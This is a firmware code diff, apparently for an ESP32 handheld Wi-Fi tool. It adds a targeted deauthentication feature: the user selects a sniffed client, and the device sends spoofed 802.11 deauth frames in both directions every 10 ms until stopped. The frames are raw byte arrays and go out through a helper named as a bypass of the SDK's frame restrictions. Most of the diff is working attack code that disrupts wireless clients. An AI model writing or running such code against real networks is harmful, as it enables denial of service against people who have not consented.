@@ -2336,7 +2336,20 @@ static uint8_t  s_targetCh = 1;
 static char     s_targetSsid[20] = {0};
 static bool     isStationView = false;
 static uint32_t s_staLastDraw = 0;
+static int      s_staSel = -1;        // selected client row, -1 = none
+static constexpr int STA_LIST_TOP = 58;
+static constexpr int STA_ROW_H    = 14;
 static portMUX_TYPE s_staMux = portMUX_INITIALIZER_UNLOCKED;
+
+/* Deauth handoff: pick a client in the station list and kick it off its AP.
+ * It cannot sniff and transmit at once -- the sniff is promiscuous, the deauth
+ * needs the AP interface -- so this is its own view that drops the sniff,
+ * sends targeted frames, and hands back to the station list on Stop. */
+static bool     isDeauthView = false;
+static uint8_t  s_deauthClient[6] = {0};
+static uint32_t s_deauthCount = 0;
+static uint32_t s_deauthLastSend = 0;
+static uint32_t s_deauthLastDraw = 0;
 
 static TaskHandle_t bgScanTaskHandle = nullptr;
 static volatile bool bgHasResults = false;
@@ -2518,9 +2531,11 @@ static void wifiScanUpdateNavLabels() {
   if (!featureHasTouchNavBar()) {
     return;
   }
-  if (isStationView) {
-    // Prev/Next do nothing here, so the up slot is free for the Stations entry.
-    setTouchNavLabels(nullptr, nullptr, "Exit", nullptr, "Back");
+  if (isDeauthView) {
+    setTouchNavLabels(nullptr, nullptr, "Exit", nullptr, "Stop");
+  } else if (isStationView) {
+    // Tap a client to select it; the up slot kicks it off the AP.
+    setTouchNavLabels(nullptr, nullptr, "Exit", "Deauth", "Back");
   } else if (isDetailView) {
     setTouchNavLabels("Scan", "Next", "Exit", "Stations", "Back");
   } else {
@@ -2994,6 +3009,8 @@ void wifiscanSetup() {
   setupTouchscreen();
 
   isStationView = false;
+  isDeauthView = false;
+  if (s_sta) { free(s_sta); s_sta = nullptr; }
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
 
@@ -3071,15 +3088,12 @@ static void stationStop() {
   isStationView = false;
 }
 
-static void stationStart() {
-  const int n = WiFi.scanComplete();
-  if (n <= 0 || currentIndex < 0 || currentIndex >= n) return;
+/* Begin (or resume) the sniff for the target already in s_targetBssid/Ch. No
+ * dependence on the scan results, which a mode switch for the deauth may have
+ * cleared -- that is why resuming after a deauth calls this, not stationStart. */
+static void stationBeginSniff() {
   if (!s_sta) s_sta = (StationEntry*)malloc(sizeof(StationEntry) * STA_MAX);
-  if (!s_sta) return;           // no room; stay in the detail view
-  memcpy(s_targetBssid, WiFi.BSSID(currentIndex), 6);
-  s_targetCh = (uint8_t)WiFi.channel(currentIndex);
-  strncpy(s_targetSsid, WiFi.SSID(currentIndex).c_str(), sizeof(s_targetSsid) - 1);
-  s_targetSsid[sizeof(s_targetSsid) - 1] = 0;
+  if (!s_sta) return;           // no room; caller stays put
 
   portENTER_CRITICAL(&s_staMux);
   s_staCount = 0;
@@ -3092,9 +3106,20 @@ static void stationStart() {
   esp_wifi_set_promiscuous(true);
 
   isStationView = true;
+  s_staSel = -1;
   s_staLastDraw = 0;
   wifiScanClearBody();
   wifiScanUpdateNavLabels();
+}
+
+static void stationStart() {    // from the AP detail view: capture the target, then sniff
+  const int n = WiFi.scanComplete();
+  if (n <= 0 || currentIndex < 0 || currentIndex >= n) return;
+  memcpy(s_targetBssid, WiFi.BSSID(currentIndex), 6);
+  s_targetCh = (uint8_t)WiFi.channel(currentIndex);
+  strncpy(s_targetSsid, WiFi.SSID(currentIndex).c_str(), sizeof(s_targetSsid) - 1);
+  s_targetSsid[sizeof(s_targetSsid) - 1] = 0;
+  stationBeginSniff();
 }
 
 static void stationDraw() {
@@ -3120,7 +3145,7 @@ static void stationDraw() {
   tft.setTextColor(WHITE, TFT_BLACK);
   tft.print(hdr);
 
-  const int top = 58, rowH = 14;
+  const int top = STA_LIST_TOP, rowH = STA_ROW_H;
   const int bottom = wifiContentBottom();
   const int maxRows = (bottom - top) / rowH;
   for (int i = 0; i < maxRows; i++) {
@@ -3130,14 +3155,97 @@ static void stationDraw() {
     char line[48];
     const unsigned long age = (now - snap[i].last_seen) / 1000UL;
     snprintf(line, sizeof(line),
-             "%02X:%02X:%02X:%02X:%02X:%02X %4ddBm %2lus",
+             "%c%02X:%02X:%02X:%02X:%02X:%02X %4ddBm %2lus",
+             i == s_staSel ? '>' : ' ',
              snap[i].mac[0], snap[i].mac[1], snap[i].mac[2],
              snap[i].mac[3], snap[i].mac[4], snap[i].mac[5],
              (int)snap[i].rssi, age);
     tft.setCursor(6, y);
-    tft.setTextColor(WHITE, TFT_BLACK);
+    tft.setTextColor(i == s_staSel ? ORANGE : WHITE, TFT_BLACK);
     tft.print(line);
   }
+}
+
+/* Build and send one targeted deauth for the selected client, both directions:
+ * AP -> client (tells the client the AP dropped it) and client -> AP (spoofs
+ * the client leaving). addr1 is the receiver, addr2 the sender, addr3 the
+ * BSSID; layout matches deauth_frame_default. */
+static void deauthSendOnce() {
+  uint8_t f[26] = {
+    0xC0, 0x00,                           // deauth, no flags
+    0x00, 0x00,                           // duration
+    0, 0, 0, 0, 0, 0,                     // addr1 (receiver)
+    0, 0, 0, 0, 0, 0,                     // addr2 (sender)
+    0, 0, 0, 0, 0, 0,                     // addr3 (BSSID)
+    0x00, 0x00,                           // seq
+    0x07, 0x00                            // reason 7 (class-3 frame from nonassoc STA)
+  };
+  memcpy(f + 4,  s_deauthClient, 6);
+  memcpy(f + 10, s_targetBssid, 6);
+  memcpy(f + 16, s_targetBssid, 6);
+  Deauther::wsl_bypasser_send_raw_frame(f, sizeof(f));
+  memcpy(f + 4,  s_targetBssid, 6);
+  memcpy(f + 10, s_deauthClient, 6);
+  memcpy(f + 16, s_targetBssid, 6);
+  Deauther::wsl_bypasser_send_raw_frame(f, sizeof(f));
+  s_deauthCount += 2;
+}
+
+static void deauthStart() {
+  esp_wifi_set_promiscuous(false);   // cannot sniff and transmit at once
+  WiFi.mode(WIFI_AP);                 // the TX helper sends on WIFI_IF_AP
+  delay(100);
+  esp_wifi_set_channel(s_targetCh ? s_targetCh : 1, WIFI_SECOND_CHAN_NONE);
+  s_deauthCount = 0;
+  s_deauthLastSend = 0;
+  s_deauthLastDraw = 0;
+  isStationView = false;
+  isDeauthView = true;
+  wifiScanClearBody();
+  wifiScanUpdateNavLabels();
+}
+
+static void deauthStop() {
+  isDeauthView = false;
+  WiFi.mode(WIFI_STA);               // hand the radio back
+  delay(100);
+}
+
+static void deauthDraw() {
+  const uint32_t now = millis();
+  if (now - s_deauthLastDraw < 300) return;
+  s_deauthLastDraw = now;
+  tft.setTextFont(1);
+  tft.setTextSize(1);
+  char buf[48];
+  tft.setCursor(10, 46);
+  tft.setTextColor(WHITE, TFT_BLACK);
+  tft.print("Deauthing client");
+  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
+           s_deauthClient[0], s_deauthClient[1], s_deauthClient[2],
+           s_deauthClient[3], s_deauthClient[4], s_deauthClient[5]);
+  tft.setCursor(10, 66); tft.setTextColor(ORANGE, TFT_BLACK); tft.print(buf);
+  snprintf(buf, sizeof(buf), "AP %s  Ch%d", s_targetSsid, (int)s_targetCh);
+  tft.setCursor(10, 86); tft.setTextColor(WHITE, TFT_BLACK); tft.print(buf);
+  tft.fillRect(0, 106, PUEO_SCREEN_W, 14, TFT_BLACK);
+  snprintf(buf, sizeof(buf), "Frames sent: %lu", (unsigned long)s_deauthCount);
+  tft.setCursor(10, 106); tft.print(buf);
+}
+
+static void deauthLoop() {
+  if (isButtonPressed(BTN_RIGHT)) {            // Stop -> back to the client list
+    delay(200);
+    deauthStop();
+    stationBeginSniff();
+    return;
+  }
+  const uint32_t now = millis();
+  if (now - s_deauthLastSend >= 10) {
+    esp_wifi_set_channel(s_targetCh ? s_targetCh : 1, WIFI_SECOND_CHAN_NONE);
+    deauthSendOnce();
+    s_deauthLastSend = now;
+  }
+  deauthDraw();
 }
 
 static void stationLoop() {
@@ -3149,14 +3257,46 @@ static void stationLoop() {
     displayWiFiDetails();
     return;
   }
+
+  // Deauth (up slot): kick the selected client off the AP.
+  if (isButtonPressed(BTN_UP)) {
+    delay(200);
+    int sel;
+    portENTER_CRITICAL(&s_staMux);
+    sel = (s_staSel >= 0 && s_staSel < s_staCount) ? s_staSel : -1;
+    if (sel >= 0) memcpy(s_deauthClient, s_sta[sel].mac, 6);
+    portEXIT_CRITICAL(&s_staMux);
+    if (sel >= 0) { deauthStart(); return; }   // no selection -> nothing to deauth
+  }
+
+  // Tap a row to select the client to deauth.
+  int tx, ty;
+  if (readTouchXY(tx, ty)) {
+    if (ty >= STA_LIST_TOP) {
+      const int row = (ty - STA_LIST_TOP) / STA_ROW_H;
+      portENTER_CRITICAL(&s_staMux);
+      if (row >= 0 && row < s_staCount) s_staSel = row;
+      portEXIT_CRITICAL(&s_staMux);
+      s_staLastDraw = 0;   // force a redraw so the highlight shows at once
+    }
+  }
+
   stationDraw();
 }
 
 void wifiscanLoop() {
 
   if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    if (isDeauthView) deauthStop();
     if (isStationView) stationStop();
+    if (s_sta) { free(s_sta); s_sta = nullptr; }   // also covers exit from the deauth view
     feature_exit_requested = true;
+    return;
+  }
+
+  if (isDeauthView) {
+    deauthLoop();
+    updateStatusBar();
     return;
   }
 
